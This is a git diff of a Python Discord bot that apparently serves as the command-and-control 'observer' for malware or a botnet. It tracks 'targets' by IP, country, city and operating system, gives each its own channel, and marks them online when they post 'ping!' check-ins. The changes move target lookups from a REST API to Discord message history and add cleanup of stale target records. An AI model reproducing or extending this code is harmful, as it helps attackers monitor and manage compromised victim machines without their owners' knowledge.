@@ -32,40 +32,37 @@ def check_if_channel_exists(channel_id):
     return False
 
 
-def get_targets_data():
-    response = requests.get(f"{__API_BASE}/targets")
+async def get_targets_data():
+    targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
+    return await targets_channel.history().flatten()
 
-    if response.status_code == 200:
-        targets = json.loads(response.text)
-        return targets
+
+def check_if_ping_message(message, ping_message_syntax):
+    return message.author.bot and message.content == ping_message_syntax
+
+
+def get_target_message_by_target_uuid(targets_messages, target_uuid):
+    for target_message in targets_messages:
+        target_data = json.loads(target_message.content)
+
+        if target_data['identifier'] == target_uuid:
+            return target_message
     return None
 
 
-def check(message, ping_message):
-    return message.author.bot and message.content == ping_message
-
-
 async def __check_targets_status():
-    ping_message = 'ping!'
-    targets_data = get_targets_data()
+    ping_message_syntax = 'ping!'
+    targets_messages = await get_targets_data()
     online = False
 
-    for target_data in targets_data:
+    for target_message in targets_messages:
+        target_data = json.loads(target_message.content)
+
         # if a target channel doesn't exist, create one and set target online status to false
         # after that continue to next target
         if not check_if_channel_exists(target_data['channel_id']):
+            await delete_old_target_message(target_data)
             await create_target_text_channel(target_data)
-            response = requests.get(f"{__API_BASE}/targetmessagebyuuid/{target_data['identifier']}")
-
-            if response.status_code == 200:
-                message = json.loads(response.text)
-                message_id = message['message_id']
-                target_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
-                target_message = await target_channel.fetch_message(message_id)
-                json_content = json.loads(target_message.content)
-                json_content['online'] = False
-                await target_message.edit(content = json.dumps(json_content))
-
             continue
 
         # fetch target's channel messages and check if a ping was delivered
@@ -76,31 +73,22 @@ async def __check_targets_status():
         messages = await channel.history(limit=100, after=new_time, oldest_first=False).flatten()
 
         for message in messages:
-            if check(message, ping_message):
+            if check_if_ping_message(message, ping_message_syntax):
                 online = True
                 break
         
         # set target's online status depending if the target pinged in the last
         # __OBSERVER_CHECK_TARGETS_DELAY_IN_MINUTES minutes
-        response = requests.get(f"{__API_BASE}/targetmessagebyuuid/{target_data['identifier']}")
+        target_message = get_target_message_by_target_uuid(targets_messages, target_data['identifier'])
 
-        if response.status_code == 200:
-            message = json.loads(response.text)
-            message_id = message['message_id']
-            target_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
-            target_message = await target_channel.fetch_message(message_id)
+        if target_message:
             json_content = json.loads(target_message.content)
             json_content['online'] = online
             await target_message.edit(content = json.dumps(json_content))
 
         online = False
 
-
-async def create_target_text_channel(target_data):
-    guild = bot.get_guild(__DISCORD_GUILD_ID)
-    target_channel = await guild.create_text_channel(target_data['identifier'], topic=f"IP: {target_data['metadata']['ip']} | COUTRY: {target_data['metadata']['country']} | CITY: {target_data['metadata']['city']} | OS: {target_data['metadata']['os']}")
-    print(f"Created new channel: {target_channel}")
-
+async def delete_old_target_message(target_data):
     targets_channel = __get_channel_by_id(__DISCORD_TARGETS_CHANNEL_ID)
     targets = await targets_channel.history().flatten()
 
@@ -109,6 +97,12 @@ async def create_target_text_channel(target_data):
 
         if target_data['channel_id'] == target_message_data['channel_id']:
             await target.delete()
+
+
+async def create_target_text_channel(target_data):
+    guild = bot.get_guild(__DISCORD_GUILD_ID)
+    target_channel = await guild.create_text_channel(target_data['identifier'], topic=f"IP: {target_data['metadata']['ip']} | COUTRY: {target_data['metadata']['country']} | CITY: {target_data['metadata']['city']} | OS: {target_data['metadata']['os']}")
+    print(f"Created new channel: {target_channel}")
 
 
 def main():
